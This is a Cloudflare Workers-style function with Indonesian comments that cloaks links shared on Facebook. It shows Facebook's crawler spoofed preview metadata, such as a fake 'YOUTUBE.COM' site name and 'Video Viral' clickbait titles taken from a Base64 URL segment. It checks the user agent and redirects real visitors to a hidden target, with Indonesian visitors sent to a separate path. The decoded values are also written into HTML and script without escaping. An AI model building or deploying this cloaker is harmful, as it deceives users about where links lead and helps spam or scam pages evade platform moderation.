export async function onRequest(context) {
  const url = new URL(context.request.url);
  const pathParts = url.pathname.split('/').filter(p => p);

  // Jika klik domain utama tanpa data, lempar ke Google
  if (pathParts.length < 1 || pathParts[0] === 'ROWX') {
    return null; 
  }

  try {
    // 1. Dekode data Base64 dari URL
    const decodedData = atob(pathParts[0]);
    const parts = decodedData.split('|||'); 

    const title  = parts[0] || "Video Viral";
    const domain = parts[1] || "YOUTUBE.COM";
    const desc   = parts[2] || "Klik untuk menonton...";
    const image  = parts[3] || "";
    const target = parts[4] || "https://google.com";

    // 2. Logika Redirect Negara (Indonesia ke /ROWX/)
    const country = context.request.cf.country;
    let finalRedirect = target;

    if (country === "ID") {
      const baseUrl = new URL(context.request.url).origin;
      finalRedirect = baseUrl + "/ROWX/"; 
    }

    // 3. Output HTML untuk Bot Facebook
    return new Response(`
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <meta property="fb:app_id" content="966242223397117">
        <meta property="og:url" content="${url.href}">
        <meta property="og:site_name" content="${domain}">
        <meta property="og:title" content="${title}">
        <meta property="og:description" content="${desc}">
        <meta property="og:image" content="${image}">
        <meta property="og:type" content="video.other">
        <meta property="og:video:url" content="${url.href}">
        <meta property="og:video:type" content="text/html">
        <script>
          // Jika user (bukan bot FB), arahkan sesuai negara
          if (!navigator.userAgent.includes('facebookexternalhit')) {
            window.location.href = "${finalRedirect}";
          }
        </script>
      </head>
      <body></body>
      </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
  } catch (e) {
    return Response.redirect("https://google.com", 302);
  }
}
